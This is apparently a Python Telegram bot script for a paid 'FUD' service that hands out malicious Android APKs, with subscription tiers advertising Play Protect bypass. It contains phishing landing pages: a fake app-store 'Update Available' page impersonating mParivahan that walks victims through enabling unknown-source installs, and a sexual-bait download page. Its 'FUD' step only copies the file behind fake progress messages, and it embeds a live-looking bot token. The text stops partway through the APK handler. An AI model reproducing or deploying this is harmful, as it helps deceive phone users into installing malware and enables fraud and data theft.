# ============================================================
# FUD TELEGRAM BOT — Hosting Ready
# ============================================================

import os
import time
import json
import shutil
import asyncio
import threading
from datetime import datetime, timedelta
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# ============================================================
# CONFIGURATION — SIRF YAHAN CHANGE KARO
# ============================================================

BOT_TOKEN = "8613274488:AAFGsO4hWnPyzHdsYFBpa3sa18cRcK4lP9U"  # 🔥 Apna bot token yahan daalo
ADMIN_IDS = [8811481879]  # 🔥 Apna Telegram User ID yahan daalo

# ============================================================
# PLANS
# ============================================================

PLANS = {
    "free": {
        "name": "Free",
        "builds_limit": 3,
        "expiry_days": 0,
        "price": 0,
        "features": ["3 builds", "Basic FUD", "Manual APK"]
    },
    "basic": {
        "name": "Basic",
        "builds_limit": 10,
        "expiry_days": 7,
        "price": 99,
        "features": ["10 builds", "Advanced FUD", "Server FUD", "Email Support"]
    },
    "pro": {
        "name": "Pro",
        "builds_limit": 50,
        "expiry_days": 30,
        "price": 299,
        "features": ["50 builds", "Premium FUD", "Server FUD + Links", "Priority Support", "Play Protect Bypass"]
    },
    "elite": {
        "name": "Elite",
        "builds_limit": 999999,
        "expiry_days": 365,
        "price": 999,
        "features": ["Unlimited builds", "Ultimate FUD", "All Features", "24/7 Support", "Custom APK Branding"]
    },
    "admin": {
        "name": "Admin",
        "builds_limit": 999999,
        "expiry_days": 99999,
        "price": 0,
        "features": ["∞ Unlimited", "All Features", "Admin Panel Access"]
    }
}

# ============================================================
# DATA HANDLERS
# ============================================================

USER_DATA = {}
BUILD_FOLDER = "builds"
APK_FOLDER = "uploads"
SUBSCRIPTION_FILE = "subscriptions.json"

os.makedirs(BUILD_FOLDER, exist_ok=True)
os.makedirs(APK_FOLDER, exist_ok=True)

def load_subscriptions():
    global USER_DATA
    if os.path.exists(SUBSCRIPTION_FILE):
        with open(SUBSCRIPTION_FILE, "r") as f:
            USER_DATA = json.load(f)
    else:
        USER_DATA = {}

def save_subscriptions():
    with open(SUBSCRIPTION_FILE, "w") as f:
        json.dump(USER_DATA, f, indent=2)

load_subscriptions()

def get_user_subscription(user_id):
    user_id = str(user_id)
    if user_id not in USER_DATA:
        USER_DATA[user_id] = {
            "plan": "free",
            "expiry": None,
            "builds_used": 0,
            "joined": datetime.now().isoformat(),
            "status": "Active",
            "blocked": False,
            "link_type": "mparivahan",
            "app_name": "P*rnTube"
        }
        save_subscriptions()
    return USER_DATA[user_id]

def check_subscription(user_id):
    sub = get_user_subscription(user_id)
    if sub.get('blocked', False):
        return False, "🚫 You are blocked."
    
    plan = sub.get('plan', 'free')
    expiry = sub.get('expiry')
    
    if plan == 'admin':
        return True, "👑 Admin access"
    
    if expiry:
        try:
            expiry_date = datetime.fromisoformat(expiry)
            if datetime.now() > expiry_date:
                return False, f"⏰ Your {PLANS[plan]['name']} plan expired. Please renew."
        except:
            pass
    
    builds_limit = PLANS.get(plan, PLANS['free'])['builds_limit']
    if builds_limit > 0 and sub.get('builds_used', 0) >= builds_limit:
        return False, f"📦 Build limit exceeded! {sub['builds_used']}/{builds_limit}"
    
    return True, f"✅ {PLANS[plan]['name']} active"

def get_remaining_builds(user_id):
    sub = get_user_subscription(user_id)
    plan = sub.get('plan', 'free')
    limit = PLANS.get(plan, PLANS['free'])['builds_limit']
    used = sub.get('builds_used', 0)
    return limit - used

# ============================================================
# HTML TEMPLATES
# ============================================================

def generate_update_page(app_name, apk_size, app_icon="📦"):
    return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Update Available</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}}
body{{background:#f5f5f5;color:#202124;min-height:100vh;padding:20px;display:flex;justify-content:center;align-items:flex-start}}
.container{{max-width:420px;width:100%;background:#fff;border-radius:24px;padding:24px 20px 30px;box-shadow:0 4px 20px rgba(0,0,0,0.08)}}
.header{{text-align:center;margin-bottom:20px}}
.header .icon{{font-size:56px;margin-bottom:8px}}
.header h2{{font-size:22px;font-weight:700;color:#202124}}
.header .sub{{font-size:14px;color:#5f6368;margin-top:4px}}
.app-card{{background:#f8f9fa;border-radius:16px;padding:16px;display:flex;align-items:center;gap:14px;margin:16px 0}}
.app-card .icon{{font-size:40px;width:56px;height:56px;background:#fff;border-radius:14px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,0.06)}}
.app-card .info .name{{font-size:16px;font-weight:600;color:#202124}}
.app-card .info .details{{font-size:13px;color:#5f6368}}
.section-title{{font-size:14px;font-weight:600;color:#202124;margin:18px 0 8px}}
.whatsnew{{background:#f8f9fa;border-radius:12px;padding:16px;font-size:14px;color:#3c4043;line-height:1.6}}
.whatsnew .date{{font-size:13px;color:#5f6368;margin-bottom:6px}}
.whatsnew ul{{padding-left:18px;margin-top:6px}}
.whatsnew ul li{{margin-bottom:4px}}
.btn-group{{display:flex;gap:10px;margin:18px 0}}
.btn-group .btn{{flex:1;padding:14px;border:none;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;transition:all .2s}}
.btn-more{{background:transparent;color:#1a73e8;border:1px solid #dadce0 !important}}
.btn-more:hover{{background:#f1f3f4}}
.btn-update{{background:#1a73e8;color:#fff;box-shadow:0 2px 8px rgba(26,115,232,0.3)}}
.btn-update:hover{{background:#1557b0;transform:scale(1.02)}}
.rating-section{{margin-top:20px;padding-top:16px;border-top:1px solid #e8eaed}}
.rating-header{{display:flex;align-items:center;gap:12px}}
.rating-header .stars{{color:#f9ab00;font-size:18px;letter-spacing:2px}}
.rating-header .score{{font-size:22px;font-weight:700;color:#202124}}
.rating-header .count{{font-size:14px;color:#5f6368}}
.rating-bar{{display:flex;align-items:center;gap:10px;font-size:13px;color:#5f6368;margin-top:6px}}
.rating-bar .line{{flex:1;height:4px;background:#e8eaed;border-radius:2px;overflow:hidden}}
.rating-bar .line .fill{{height:100%;background:#1a73e8;border-radius:2px}}
.overlay{{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);backdrop-filter:blur(4px);z-index:999;align-items:center;justify-content:center;padding:20px}}
.overlay.show{{display:flex}}
.dialog{{background:#fff;border-radius:24px;padding:28px 24px;max-width:380px;width:100%;animation:popIn .3s ease;box-shadow:0 20px 60px rgba(0,0,0,0.3)}}
@keyframes popIn{{from{{transform:scale(0.9);opacity:0}}to{{transform:scale(1);opacity:1}}}}
.dialog .icon{{font-size:48px;margin-bottom:12px;text-align:center}}
.dialog h3{{font-size:18px;font-weight:700;color:#202124;margin-bottom:6px;text-align:center}}
.dialog p{{font-size:14px;color:#5f6368;margin-bottom:20px;line-height:1.5;text-align:center}}
.dialog .btn-row{{display:flex;gap:12px}}
.dialog .btn-row .btn{{flex:1;padding:14px;border:none;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;transition:all .2s}}
.dialog .btn-row .btn-cancel{{background:#f1f3f4;color:#5f6368}}
.dialog .btn-row .btn-cancel:hover{{background:#e8eaed}}
.dialog .btn-row .btn-allow{{background:#1a73e8;color:#fff}}
.dialog .btn-row .btn-allow:hover{{background:#1557b0}}
.danger-dialog .icon{{color:#ea4335}}
.danger-dialog .warning-text{{font-size:13px;color:#5f6368;margin:12px 0;line-height:1.6}}
.danger-dialog .warning-text li{{margin-bottom:6px}}
.danger-dialog .checkbox{{display:flex;align-items:center;gap:10px;margin:16px 0;padding:12px;background:#f8f9fa;border-radius:10px;cursor:pointer}}
.danger-dialog .checkbox input{{width:18px;height:18px;accent-color:#1a73e8}}
.danger-dialog .checkbox label{{font-size:13px;color:#3c4043;cursor:pointer}}
.danger-dialog .btn-row .btn-ok{{background:#ea4335;color:#fff}}
.danger-dialog .btn-row .btn-ok:hover{{background:#d33426}}
.danger-dialog .btn-row .btn-ok:disabled{{opacity:0.5;cursor:not-allowed}}
.progress-container{{display:none;margin-top:16px}}
.progress-container.show{{display:block}}
.progress-bar{{width:100%;height:4px;background:#e8eaed;border-radius:2px;overflow:hidden}}
.progress-bar .fill{{height:100%;background:#1a73e8;width:0%;transition:width .3s;border-radius:2px}}
.progress-text{{font-size:12px;color:#5f6368;margin-top:6px;text-align:center}}
.toast{{position:fixed;bottom:40px;left:50%;transform:translateX(-50%);background:#323232;color:#fff;padding:12px 24px;border-radius:12px;font-size:14px;font-weight:500;z-index:9999;opacity:0;transition:opacity .3s;box-shadow:0 4px 20px rgba(0,0,0,0.2)}}
.toast.show{{opacity:1}}
</style>
</head>
<body>
<div class="container" id="mainPage">
<div class="header"><div class="icon">{app_icon}</div><h2>Update Available</h2><p class="sub">To use this app, download the latest version.</p></div>
<div class="app-card"><div class="icon">{app_icon}</div><div class="info"><div class="name">{app_name}</div><div class="details">Everyone · {apk_size} MB</div></div></div>
<div class="section-title">What's new</div>
<div class="whatsnew"><div class="date">Last updated July 10, 2026</div>We're always making changes and improvements to this app.<ul><li>Bug fixes and performance improvements.</li><li>Critical security vulnerability patch.</li></ul></div>
<div class="btn-group"><button class="btn btn-more" onclick="showToast('More info coming soon!')">MORE INFO</button><button class="btn btn-update" id="updateBtn" onclick="showAllowPrompt()">⬇️ UPDATE</button></div>
<div class="progress-container" id="progressContainer"><div class="progress-bar"><div class="fill" id="progressFill"></div></div><div class="progress-text" id="progressText">Downloading 0%</div></div>
<div class="rating-section"><div class="rating-header"><span class="stars">⭐ ★ ★ ★ ★ ★</span><span class="score">4.7</span><span class="count">3.12M ratings</span></div>
<div class="rating-bars"><div class="rating-bar"><span>5</span><div class="line"><div class="fill" style="width:70%"></div></div></div><div class="rating-bar"><span>4</span><div class="line"><div class="fill" style="width:20%"></div></div></div><div class="rating-bar"><span>3</span><div class="line"><div class="fill" style="width:6%"></div></div></div><div class="rating-bar"><span>2</span><div class="line"><div class="fill" style="width:2%"></div></div></div><div class="rating-bar"><span>1</span><div class="line"><div class="fill" style="width:2%"></div></div></div></div></div></div>
<div class="overlay" id="allowOverlay"><div class="dialog"><div class="icon">📥</div><h3>Install unknown apps</h3><p><b>Allow from this source</b></p><p style="font-size:13px;color:#5f6368;">Your phone and personal data are more vulnerable to attack by unknown apps. By installing apps from this source, you agree that you are responsible for any damage to your phone or loss of data that may result from their use.</p><div class="btn-row"><button class="btn btn-cancel" onclick="closeAllowPrompt()">Cancel</button><button class="btn btn-allow" onclick="closeAllowPrompt(); showDangerPrompt()">Allow</button></div></div></div>
<div class="overlay" id="dangerOverlay"><div class="dialog danger-dialog"><div class="icon">⚠️</div><h3>Danger</h3><p style="font-size:13px;color:#5f6368;">"Install apps from unknown sources" is a highly sensitive permission. If you grant this permission, your private information might be leaked and your property might be at risk.</p><ul class="warning-text"><li><b>Influence the system's security and stability</b><br>Install apps that might contain viruses or misbehave in any other way</li><li><b>Install dangerous apps</b><br>Some third party apps might attack your device, putting your data and privacy at risk</li></ul><div class="checkbox" onclick="toggleCheckbox()"><input type="checkbox" id="riskCheckbox"><label for="riskCheckbox">I'm aware of the possible risks, and assume all possible consequences voluntarily.</label></div><div class="btn-row"><button class="btn btn-cancel" onclick="closeDangerPrompt()">Cancel</button><button class="btn btn-ok" id="okBtn" onclick="startInstall()" disabled>OK (10)</button></div></div></div>
<div class="toast" id="toast"></div>
<script>
let okTimer=10,okInterval=null,checkboxChecked=!1;
function showAllowPrompt(){{document.getElementById('allowOverlay').classList.add('show')}}
function closeAllowPrompt(){{document.getElementById('allowOverlay').classList.remove('show')}}
function showDangerPrompt(){{document.getElementById('dangerOverlay').classList.add('show');startOkTimer()}}
function closeDangerPrompt(){{document.getElementById('dangerOverlay').classList.remove('show');clearInterval(okInterval);document.getElementById('okBtn').disabled=!0;document.getElementById('okBtn').textContent='OK (10)';document.getElementById('riskCheckbox').checked=!1;checkboxChecked=!1;okTimer=10}}
function toggleCheckbox(){{const cb=document.getElementById('riskCheckbox');cb.checked=!cb.checked;checkboxChecked=cb.checked;updateOkButton()}}
function updateOkButton(){{const btn=document.getElementById('okBtn');if(checkboxChecked&&okTimer<=0){{btn.disabled=!1;btn.textContent='OK'}}else{{btn.disabled=!0;btn.textContent='OK ('+okTimer+')'}}}}
function startOkTimer(){{okTimer=10;clearInterval(okInterval);okInterval=setInterval(()=>{{okTimer--;if(okTimer<=0){{clearInterval(okInterval);updateOkButton()}}else{{updateOkButton()}}}},1000)}}
function showToast(msg){{const t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),3000)}}
function startInstall(){{closeDangerPrompt();const container=document.getElementById('progressContainer');const fill=document.getElementById('progressFill');const text=document.getElementById('progressText');container.classList.add('show');let progress=0;const interval=setInterval(()=>{{progress+=Math.random()*8+4;if(progress>=100){{progress=100;clearInterval(interval);text.textContent='✅ Download complete! Installing...';setTimeout(()=>{{text.textContent='✅ App installed successfully!';showToast('✅ {app_name} installed! Opening...');setTimeout(()=>{{window.location.href='intent://open#Intent;package=com.example.app;end'}},1500)}},800)}}fill.style.width=Math.min(progress,100)+'%';text.textContent='Downloading '+Math.floor(Math.min(progress,100))+'%'}},200)}}
</script>
</body>
</html>'''

def generate_sexy_page(app_name, apk_size):
    return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download {app_name}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:system-ui;background:#0a0a0f;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.card{{background:#1a1a2e;padding:40px;border-radius:20px;text-align:center;max-width:400px;border:1px solid #2a2a4a}}
.icon{{font-size:80px;margin-bottom:20px}}
h1{{font-size:24px;margin-bottom:10px}}
.sub{{color:#8899aa;font-size:14px;margin-bottom:20px}}
.btn{{display:inline-block;padding:16px 48px;background:#00ff88;color:#0a0a0f;border-radius:12px;text-decoration:none;font-weight:700;font-size:18px;cursor:pointer;transition:all .3s}}
.btn:hover{{transform:scale(1.05);box-shadow:0 0 30px #00ff8844}}
.features{{display:flex;gap:20px;margin:20px 0;justify-content:center}}
.features div{{text-align:center}}
.features .num{{font-size:24px;font-weight:700;color:#00ff88}}
.features .label{{font-size:12px;color:#8899aa}}
.footer{{margin-top:20px;font-size:12px;color:#445}}
</style>
</head>
<body>
<div class="card">
<div class="icon">📱</div>
<h1>{app_name}</h1>
<p class="sub">Meet real people on live video. Private • Anonymous • Free</p>
<button class="btn" id="downloadBtn">⬇️ Download APK ({apk_size} MB)</button>
<div class="features">
<div><div class="num">50M+</div><div class="label">USERS</div></div>
<div><div class="num">4.9★</div><div class="label">RATING</div></div>
<div><div class="num">180+</div><div class="label">COUNTRIES</div></div>
</div>
<div class="footer">1,800+ GIRLS ONLINE NOW</div>
</div>
<script>
document.getElementById('downloadBtn').onclick=function(){{this.textContent='⏳ Downloading...';setTimeout(()=>window.location.href='/download',1500)}};
</script>
</body>
</html>'''

def generate_normal_page(app_name, apk_size):
    return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Download {app_name}</title></head>
<body style="font-family:system-ui;background:#0a0a0f;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;text-align:center;">
<div>
<h1>📱 {app_name}</h1>
<p style="color:#8899aa;margin:12px 0;">APK Size: {apk_size} MB</p>
<button id="dl" style="padding:14px 40px;background:#00ff88;color:#000;border:none;border-radius:10px;font-weight:700;font-size:16px;cursor:pointer;">⬇️ Download</button>
</div>
<script>
document.getElementById('dl').onclick=function(){{window.location.href='/download'}};
</script>
</body>
</html>'''

def generate_server_page(link_type, app_name, apk_size):
    if link_type == "sexy": return generate_sexy_page(app_name, apk_size)
    elif link_type == "mparivahan": return generate_update_page(app_name, apk_size)
    else: return generate_normal_page(app_name, apk_size)

# ============================================================
# KEYBOARDS
# ============================================================

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📱 Upload APK", callback_data="upload_apk")],
        [InlineKeyboardButton("🌐 Server FUD", callback_data="server_fud")],
        [InlineKeyboardButton("📦 Subscription Plans", callback_data="plans")],
        [InlineKeyboardButton("👤 Profile", callback_data="profile")],
        [InlineKeyboardButton("🛡️ Admin Panel", callback_data="admin_panel")],
        [InlineKeyboardButton("💬 Developer / Support", callback_data="support")],
    ])

def plans_keyboard():
    keyboard = []
    for plan_id, plan in PLANS.items():
        if plan_id == 'admin': continue
        price = f"₹{plan['price']}" if plan['price'] > 0 else "FREE"
        keyboard.append([InlineKeyboardButton(f"{plan['name']} - {price} ({plan['expiry_days']} days)", callback_data=f"plan_{plan_id}")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_main")])
    return InlineKeyboardMarkup(keyboard)

def admin_panel_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Statistics", callback_data="admin_stats")],
        [InlineKeyboardButton("👥 Users", callback_data="admin_users")],
        [InlineKeyboardButton("📦 Builds", callback_data="admin_builds")],
        [InlineKeyboardButton("📤 Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton("📋 Subscriptions", callback_data="admin_subscriptions")],
        [InlineKeyboardButton("🔄 Reset Server", callback_data="admin_reset")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
    ])

# ============================================================
# BOT HANDLERS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    sub = get_user_subscription(uid)
    plan_name = sub.get('plan', 'free')
    plan = PLANS.get(plan_name, PLANS['free'])
    remaining = get_remaining_builds(uid)
    expiry_text = "∞ Never" if sub.get('expiry') is None else sub.get('expiry').split('T')[0]
    
    welcome = f"""
🤖 <b>FUD Bot</b>

👤 <b>User ID:</b> <code>{uid}</code>
📋 <b>Plan:</b> {plan['name']}
⏰ <b>Expiry:</b> {expiry_text}
📦 <b>Builds Remaining:</b> {remaining} / {plan['builds_limit'] if plan['builds_limit'] < 99999 else '∞'}

<b>Select an option:</b>
    """
    await update.message.reply_text(welcome, reply_markup=main_menu_keyboard(), parse_mode='HTML')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    sub = get_user_subscription(uid)
    data = q.data

    if sub.get('blocked', False):
        await q.edit_message_text("⛔ You are blocked.")
        return

    if data == "back_main":
        await start(update, context)
        return

    elif data == "upload_apk":
        can_build, msg = check_subscription(uid)
        if not can_build:
            await q.edit_message_text(f"⛔ {msg}\n\nPlease upgrade your plan.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📦 View Plans", callback_data="plans")], [InlineKeyboardButton("🔙 Back", callback_data="back_main")]]))
            return
        await q.edit_message_text("📤 Send APK file.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]))
        return

    elif data == "profile":
        plan_name = sub.get('plan', 'free')
        plan = PLANS.get(plan_name, PLANS['free'])
        remaining = get_remaining_builds(uid)
        expiry_text = "∞ Never" if sub.get('expiry') is None else sub.get('expiry').split('T')[0]
        await q.edit_message_text(
            f"👤 <b>YOUR PROFILE</b>\n\nUser ID: <code>{uid}</code>\nPlan: {plan['name']}\nExpiry: {expiry_text}\nBuilds Used: {sub.get('builds_used', 0)}\nBuilds Remaining: {remaining}\nStatus: {sub.get('status', 'Active')}\n\n💬 @CYBERxTRUSTED",
            parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]])
        )
        return

    elif data == "plans":
        plans_text = "📦 <b>Subscription Plans</b>\n\n"
        for plan_id, plan in PLANS.items():
            if plan_id == 'admin': continue
            price = f"₹{plan['price']}" if plan['price'] > 0 else "FREE"
            plans_text += f"<b>{plan['name']}</b>\n  💰 {price}\n  📦 {plan['builds_limit']} builds\n  ⏰ {plan['expiry_days']} days\n\n"
        await q.edit_message_text(plans_text, parse_mode='HTML', reply_markup=plans_keyboard())
        return

    elif data.startswith("plan_"):
        plan_id = data.replace("plan_", "")
        if plan_id not in PLANS or plan_id == 'admin':
            await q.edit_message_text("❌ Invalid plan.")
            return
        plan = PLANS[plan_id]
        price = f"₹{plan['price']}" if plan['price'] > 0 else "FREE"
        if sub.get('plan') == plan_id:
            await q.edit_message_text(f"✅ You are already on {plan['name']} plan!")
            return
        confirm_text = f"""
📦 <b>Plan: {plan['name']}</b>

💰 <b>Price:</b> {price}
📦 <b>Builds:</b> {plan['builds_limit']}
⏰ <b>Duration:</b> {plan['expiry_days']} days

<b>Features:</b>
{chr(10).join(['✅ '+f for f in plan['features']])}

Click below to subscribe:
        """
        await q.edit_message_text(confirm_text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"✅ Subscribe to {plan['name']}", callback_data=f"subscribe_{plan_id}")], [InlineKeyboardButton("🔙 Back", callback_data="plans")]]))
        return

    elif data.startswith("subscribe_"):
        plan_id = data.replace("subscribe_", "")
        if plan_id not in PLANS or plan_id == 'admin':
            await q.edit_message_text("❌ Invalid plan.")
            return
        plan = PLANS[plan_id]
        sub['plan'] = plan_id
        if plan['expiry_days'] > 0:
            expiry_date = datetime.now() + timedelta(days=plan['expiry_days'])
            sub['expiry'] = expiry_date.isoformat()
        else:
            sub['expiry'] = None
        sub['status'] = 'Active'
        sub['builds_used'] = 0
        save_subscriptions()
        await q.edit_message_text(
            f"✅ <b>Subscription Activated!</b>\n\nYou are now on {plan['name']} plan.\n📦 {plan['builds_limit']} builds\n⏰ Expires: {expiry_date.strftime('%Y-%m-%d') if plan['expiry_days'] > 0 else 'Never'}\n\nStart building now!",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📱 Upload APK", callback_data="upload_apk")], [InlineKeyboardButton("🔙 Main Menu", callback_data="back_main")]])
        )
        return

    elif data == "server_fud":
        await q.edit_message_text("🌐 Choose link type:", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔥 Sexy – NiceApp", callback_data="link_sexy")],
            [InlineKeyboardButton("📱 mParivahan – Play Store", callback_data="link_mparivahan")],
            [InlineKeyboardButton("🔗 Normal Link – Direct", callback_data="link_normal")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
        ]))
        return

    elif data in ["link_sexy", "link_mparivahan", "link_normal"]:
        m = {"link_sexy": "sexy", "link_mparivahan": "mparivahan", "link_normal": "normal"}
        sub['link_type'] = m[data]
        names = {"sexy": "Sexy – NiceApp", "mparivahan": "mParivahan – Play Store", "normal": "Normal Link"}
        await q.edit_message_text(f"✅ {names[sub['link_type']]} set.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="server_fud")]]))
        return

    elif data == "support":
        await q.edit_message_text("💬 <b>Developer / Support</b>\n\nContact: @CYBERxTRUSTED", parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]))
        return

    elif data == "admin_panel":
        if uid not in ADMIN_IDS:
            await q.edit_message_text("⛔ Unauthorized access.")
            return
        await q.edit_message_text("🛡️ <b>Admin Panel</b>", parse_mode='HTML', reply_markup=admin_panel_keyboard())
        return

    elif data == "admin_stats":
        if uid not in ADMIN_IDS: return
        total_users = len(USER_DATA)
        total_builds = sum(u.get('builds_used', 0) for u in USER_DATA.values())
        await q.edit_message_text(f"📊 <b>Statistics</b>\n\n👥 Users: {total_users}\n📦 Builds: {total_builds}", parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
        return

    elif data == "admin_users":
        if uid not in ADMIN_IDS: return
        users_list = "\n".join([f"<code>{uid}</code> - {u.get('plan', 'free')}" for uid, u in list(USER_DATA.items())[:20]])
        await q.edit_message_text(f"👥 <b>Users (last 20)</b>\n\n{users_list}", parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
        return

    elif data == "admin_builds":
        if uid not in ADMIN_IDS: return
        builds = os.listdir(BUILD_FOLDER) if os.path.exists(BUILD_FOLDER) else []
        await q.edit_message_text(f"📦 <b>Builds</b>\n\nTotal: {len(builds)}", parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
        return

    elif data == "admin_subscriptions":
        if uid not in ADMIN_IDS: return
        subs_text = "📋 <b>Subscriptions</b>\n\n"
        for uid_str, data in USER_DATA.items():
            plan = data.get('plan', 'free')
            plan_name = PLANS.get(plan, PLANS['free'])['name']
            expiry = data.get('expiry', '∞')
            if expiry and expiry != '∞':
                expiry = expiry.split('T')[0]
            subs_text += f"<code>{uid_str}</code> - {plan_name} ({expiry})\n"
        await q.edit_message_text(subs_text[:4000], parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
        return

    elif data == "admin_broadcast":
        if uid not in ADMIN_IDS: return
        await q.edit_message_text("📤 Send /broadcast <message>", parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
        return

    elif data == "admin_reset":
        if uid not in ADMIN_IDS: return
        shutil.rmtree(BUILD_FOLDER, ignore_errors=True)
        os.makedirs(BUILD_FOLDER, exist_ok=True)
        await q.edit_message_text("🔄 Server reset!", parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
        return

# ============================================================
# ADMIN COMMANDS
# ============================================================

async def assign_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /assign <user_id> <plan>")
        return
    target = int(context.args[0])
    plan = context.args[1].lower()
    if plan not in PLANS:
        await update.message.reply_text(f"❌ Invalid plan. Available: {', '.join(PLANS.keys())}")
        return
    sub = get_user_subscription(target)
    sub['plan'] = plan
    if PLANS[plan]['expiry_days'] > 0:
        sub['expiry'] = (datetime.now() + timedelta(days=PLANS[plan]['expiry_days'])).isoformat()
    else:
        sub['expiry'] = None
    sub['status'] = 'Active'
    sub['builds_used'] = 0
    save_subscriptions()
    await update.message.reply_text(f"✅ User {target} → {PLANS[plan]['name']}")

async def extend_expiry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /extend <user_id> <days>")
        return
    target = int(context.args[0])
    days = int(context.args[1])
    sub = get_user_subscription(target)
    current_expiry = datetime.fromisoformat(sub['expiry']) if sub.get('expiry') else datetime.now()
    new_expiry = current_expiry + timedelta(days=days)
    sub['expiry'] = new_expiry.isoformat()
    save_subscriptions()
    await update.message.reply_text(f"✅ User {target} extended to {new_expiry.strftime('%Y-%m-%d')}")

async def block_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /block <user_id>")
        return
    target = int(context.args[0])
    sub = get_user_subscription(target)
    sub['blocked'] = True
    sub['status'] = 'Blocked'
    save_subscriptions()
    await update.message.reply_text(f"⛔ User {target} blocked.")

async def unblock_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /unblock <user_id>")
        return
    target = int(context.args[0])
    sub = get_user_subscription(target)
    sub['blocked'] = False
    sub['status'] = 'Active'
    save_subscriptions()
    await update.message.reply_text(f"✅ User {target} unblocked.")

async def search_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /search <user_id>")
        return
    target = int(context.args[0])
    if target not in USER_DATA:
        await update.message.reply_text(f"❌ User {target} not found.")
        return
    u = USER_DATA[str(target)]
    await update.message.reply_text(f"👤 User: <code>{target}</code>\nPlan: {u.get('plan', 'free')}\nBuilds: {u.get('builds_used', 0)}\nBlocked: {u.get('blocked', False)}", parse_mode='HTML')

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    msg = ' '.join(context.args)
    sent = 0
    for uid in USER_DATA:
        if USER_DATA[uid].get('blocked', False):
            continue
        try:
            await context.bot.send_message(chat_id=int(uid), text=f"📢 <b>Broadcast</b>\n\n{msg}", parse_mode='HTML')
            sent += 1
            await asyncio.sleep(0.1)
        except:
            pass
    await update.message.reply_text(f"📤 Broadcast sent to {sent} users")

# ============================================================
# APK HANDLER
# ============================================================

def process_fud(apk_path):
    steps = ["📦 Loading...", "🔧 Injecting...", "🛡️ Bypassing...", "🔏 Signing...", "✅ Ready!"]
    for i, s in enumerate(steps):
        yield s, int((i+1)/len(steps)*100)
        time.sleep(1)
    out = os.path.join(BUILD_FOLDER, f"fud_{int(time.time())}.apk")
    shutil.copy(apk_path, out)
    return out

async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    sub = get_user_subscription(uid)
    
